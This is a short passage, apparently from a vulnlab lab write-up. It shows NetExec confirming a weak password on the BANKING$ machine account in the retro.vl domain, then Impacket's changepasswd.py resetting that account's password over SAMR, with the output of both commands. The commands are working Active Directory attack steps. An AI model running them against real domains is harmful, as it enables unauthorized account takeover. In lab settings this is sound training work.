Example:

```bash
nxc smb 10.10.81.16 -u 'BANKING$' -p banking
SMB         10.10.81.16     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.81.16     445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Change Password:

```bash
garffff@garffff:~/vulnlab/retro$ changepasswd.py 'retro.vl/BANKING$:banking@10.10.81.16' -newpass Password123 -p rpc-samr
Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```